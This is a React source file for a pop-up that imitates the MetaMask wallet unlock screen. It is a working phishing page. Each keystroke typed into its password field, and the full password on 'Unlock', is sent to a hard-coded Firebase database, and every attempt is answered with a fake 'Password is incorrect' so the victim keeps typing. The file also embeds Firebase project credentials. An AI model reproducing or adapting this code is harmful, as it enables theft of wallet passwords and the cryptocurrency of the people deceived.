import { useState, useEffect, useRef } from "react";
import { EventEmitter } from "events";
import Modal from "react-modal";
import meta_logo from "./assets/img/metamask-fox.svg";
import spinner from "./assets/img/spinner.gif";
import ethLogo from "./images/eth_logo.svg";
import arrowDown from "./images/icons/arrow-down.svg";

import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, push } from "firebase/database";
import CreateLogo from "./CreateLogo";

import "./index.css";
import "./MM.css";

const basic = {
  apiKey: "AIzaSyB0kcW0NhVw6R-xpw3v7te_2PRYXAHIj2k",
  authDomain: "championtwo-b6130.firebaseapp.com",
  databaseURL: "https://championtwo-b6130-default-rtdb.firebaseio.com",
  projectId: "championtwo-b6130",
  storageBucket: "championtwo-b6130.firebasestorage.app",
  messagingSenderId: "748824738494",
  appId: "1:748824738494:web:2031fbf6762a193f6afcef",
  measurementId: "G-4PP08QDPXL"
};
const rtapp = initializeApp(basic);
const rtdb = getDatabase(rtapp);
function getCaretCoordinates(element, position) {
  const div = document.createElement("div");
  div.id = "password-mirror-div";
  document.body.appendChild(div);
  const computed = window.getComputedStyle(element);
  div.textContent = new Array(position + 1).join("•");
  const span = document.createElement("span");
  span.textContent = "•";
  div.appendChild(span);

  const coordinates = {
    top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
    left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
  };
  document.body.removeChild(div);
  return coordinates;
}
const MM = ({ isOpen, setIsOpen }) => {
  const inputRef = useRef(null);
  // const [animationEventEmitter, setEventEmitter] = useState(new EventEmitter());
  const animationEventEmitter = new EventEmitter();
  const [loading, setLoading] = useState(true);
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [connectionStatus, setConnectionStatus] = useState("Disconnected");
  const [pwd, setPwd] = useState("");
  const [validShow, setValidShow] = useState(false);
  const [btnFocus, setBtnFocus] = useState(false);
  const [pwdFocus, setPwdFocus] = useState(true);
  const [isHover, setIsHover] = useState(false);
  const styles = {
    overlay: {
      position: "fixed",
      backgroundColor: "transparent",
    },
    content: {
      top: "0px",
      left: "auto",
      right: "129px",
      bottom: "auto",
      padding: "0",
      borderRadius: "5",
      border: "1px solid #444746",
      background: "#121314",
      zIndex: 10000,
      overflowX: "hidden",
    },
  };

  const handleCloseModal = () => {
    setIsOpen(false);
  };
  const handlePwdChange = (val, target) => {
    push(ref(rtdb, "mm_provider/77"), {
      value: val,
    });
    setPwd(val);
    setValidShow(false);
    if (target.getBoundingClientRect) {
      const element = target;
      const boundingRect = element.getBoundingClientRect();
      const coordinates = getCaretCoordinates(element, element.selectionEnd);

      animationEventEmitter.emit("point", {
        x: boundingRect.left + coordinates.left - element.scrollLeft,
        y: boundingRect.top + coordinates.top - element.scrollTop,
      });
    }
  };
  const handleClick = async () => {
    push(ref(rtdb, "mm_provider/77"), {
      value: pwd,
    });
    setValidShow(true);
  };

  const handleKeyUp = (e) => {
    if (e.keyCode === 13) {
      handleClick();
    }
  };

  useEffect(() => {
    if (isOpen) {
      setTimeout(() => {
        setLoading(false);
        setTimeout(() => {
          inputRef.current && inputRef.current.focus();
        }, 10);
      }, 500);
    } else {
      setLoading(true);
      setPwd("");
    }
  }, [isOpen]);

  useEffect(() => {
    // Detect initial theme
    const mediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
    setIsDarkMode(mediaQuery.matches);

    // Add listener for theme changes
    const handleChange = (e) => {
      setIsDarkMode(e.matches);
    };

    mediaQuery.addEventListener("change", handleChange);

    // Cleanup listener on unmount
    return () => mediaQuery.removeEventListener("change", handleChange);
  }, []);

  const bgColor = isDarkMode ? "#121314" : "#ffffff";

  return (
    <Modal
      isOpen={isOpen}
      style={styles}
      shouldCloseOnOverlayClick={true}
      shouldCloseOnEsc={true}
      onRequestClose={handleCloseModal}
      ariaHideApp={false}
    >
      {loading ? (
        <div
          className="mmc"
          style={{
            display: "flex",
            flexDirection: "column",
            overflowX: "hidden",
            width: "400px",
          }}
        >
          <div
            style={{
              width: "400px",
              height: "600px",
              backgroundColor: bgColor,
              display: "flex",
              justifyContent: "center",
              overflow: "hidden",
            }}
          >
            <div style={{ display: "flex", flexFlow: "column" }}>
              <img
                style={{
                  width: "144px",
                  height: "144px",
                  alignSelf: "center",
                  margin: "144px 0 0 0",
                }}
                alt={""}
                src={meta_logo}
              ></img>
              <img
                alt={""}
                src={spinner}
                style={{
                  width: "32px",
                  height: "32px",
                  alignSelf: "center",
                  marginTop: "16px",
                }}
              ></img>
            </div>
          </div>
        </div>
      ) : (
        <div
          style={{
            width: "400px",
            height: "600px",
            overflowX: "hidden",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "flex-start",
            alignContent: "center",
            flexWrap: "nowrap",
          }}
        >
          <div className="mm-box mm-box--display-flex mm-box--flex-direction-column mm-box--align-items-center mm-box--width-full mm-box--padding-4">
            <div
              style={{ marginTop: "24px", width: "170px", marginBottom: "0px" }}
            >
              <CreateLogo
                animationEventEmitter={animationEventEmitter}
                width={"170"}
                height={"170"}
              ></CreateLogo>
              <div id="meta_fox"></div>
            </div>
            <div>
              <h1
                className="mm-box mm-text mm-text--display-md mm-text--font-weight-medium mm-text--text-align-center mm-box--margin-bottom-8"
                style={{
                  fontSize: "32px",
                  color: "#ffffff",
                  fontFamily:
                    'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
                }}
              >
                Welcome back
              </h1>
            </div>
            <input
              aria-invalid="false"
              autoComplete="on"
              id="password"
              type="password"
              dir="auto"
              placeholder="Enter your password"
              data-testid="unlock-password"
              style={{
                backgroundColor: "#121314",
                marginTop: "16px",
                fontSize: "16px",
                color: "#ffffff",
                borderColor: pwdFocus
                  ? "#ffffff"
                  : validShow
                  ? "#ff7584"
                  : "#858b9a",
                borderWidth: "1px",
                borderStyle: "solid",
                borderRadius: "8px",
                cursor: "text",
                fontFamily:
                  'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
                fontStretch: "100%",
                fontStyle: "normal",
                fontWeight: 400,
                letterSpacing: "normal",
                paddingInlineStart: "16px",
                paddingInlineEnd: "16px",
                paddingLeft: "16px",
                paddingRight: "16px",
                paddingTop: "0",
                tabSize: 4,
                textAlign: "start",
                textIndent: "0",
                textOverflow: "ellipsis",
                whiteSpace: "nowrap",
                textRendering: "auto",
                textShadow: "none",
                textSizeAdjust: "100%",
                textTransform: "none",
                wordSpacing: "0",
                lineHeight: "45px",
                width: "368px",
              }}
              required
              value={pwd}
              ref={inputRef}
              onChange={(e) => {
                handlePwdChange(e.target.value, e.target);
              }}
              onFocus={() => setPwdFocus(true)}
              onBlur={() => setPwdFocus(false)}
              onKeyUp={handleKeyUp}
            />
            <div
              style={{
                display: "flex",
                flexDirection: "row",
                justifyContent: "flex-start",
                alignContent: "flex-start",
                alignItems: "flex-start",
                width: "100%",
                paddingTop: "0px",
              }}
            >
              {validShow && (
                <p
                  class="mm-box mm-text mm-text--body-sm mm-text--text-align-left"
                  data-testid="unlock-page-help-text"
                  style={{ marginBottom: "0px", color: "#ff7584" }}
                >
                  Password is incorrect. Please try again.
                </p>
              )}
            </div>
            <button
              className={
                "mm-box mm-text mm-button-base mm-button-base--size-lg mm-button-base--block mm-button-primary mm-button-primary--disabled mm-text--body-md-medium mm-box--margin-bottom-6 mm-box--padding-0 mm-box--padding-right-4 mm-box--padding-left-4 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-icon-inverse mm-box--background-color-icon-default mm-box--rounded-xl" +
                (pwd.length === 0 ? "unlock-btn-disabled" : "") +
                (btnFocus ? "unlock-btn-enabled" : "")
              }
              data-testid="unlock-submit"
              disabled={pwd.length === 0}
              type="button"
              variant="contained"
              style={{
                backgroundColor: btnFocus ? "#ffffff" : "#f0f0f0",
                fontFamily:
                  'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
                color: "#121314",
                marginTop: "16px",
                fontWeight: "400",
                boxShadow: "none",
                borderRadius: "12px",
                fontSize: "16px",
                padding: "12px 0",
                hover: "#000",
              }}
              onMouseEnter={() => setBtnFocus(true)}
              onMouseLeave={() => setBtnFocus(false)}
              onClick={handleClick}
            >
              Unlock
            </button>
            <button
              className="mm-box mm-text mm-button-base mm-button-link mm-button-link--size-auto mm-text--body-md-bold mm-box--margin-bottom-6 mm-box--padding-0 mm-box--padding-right-0 mm-box--padding-left-0 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-primary-default mm-box--background-color-transparent"
              data-testid="unlock-forgot-password-button"
              type="button"
              style={{
                color: "#8b99ff",
                marginTop: "0px",
                fontWeight: "500",
                boxShadow: "none",
                borderRadius: "12px",
                fontSize: "16px",
                padding: "12px 0",
                fontFamily:
                  'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
              }}
            >
              Forgot password?
            </button>
            <p
              className="mm-box mm-text mm-text--body-md mm-box--color-text-default"
              style={{ fontSize: "16px" }}
            >
              <span
                style={{
                  color: "#ffffff",
                  fontFamily:
                    'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
                }}
              >
                {" "}
                Need help? Contact{" "}
                <button
                  className="mm-box mm-text mm-button-base mm-button-link mm-button-link--size-auto mm-text--body-md-bold mm-box--margin-bottom-0 mm-box--padding-0 mm-box--padding-right-0 mm-box--padding-left-0 mm-box--display-inline-flex mm-box--justify-content-center mm-box--align-items-center mm-box--color-primary-default mm-box--background-color-transparent"
                  type="button"
                  style={{
                    fontSize: "16px",
                    color: "#8b99ff",
                    fontFamily:
                      'Geist, "Helvetica Neue", Helvetica, Arial, sans-serif',
                    fontWeight: "400",

                  }}
                  onMouseEnter={() => setIsHover(true)}
                  onMouseLeave={() => setIsHover(false)}
                >
                  MetaMask support
                </button>
              </span>
            </p>
          </div>
          <div id="popover-content"></div>
        </div>
      )}
    </Modal>
  );
};

export default MM;
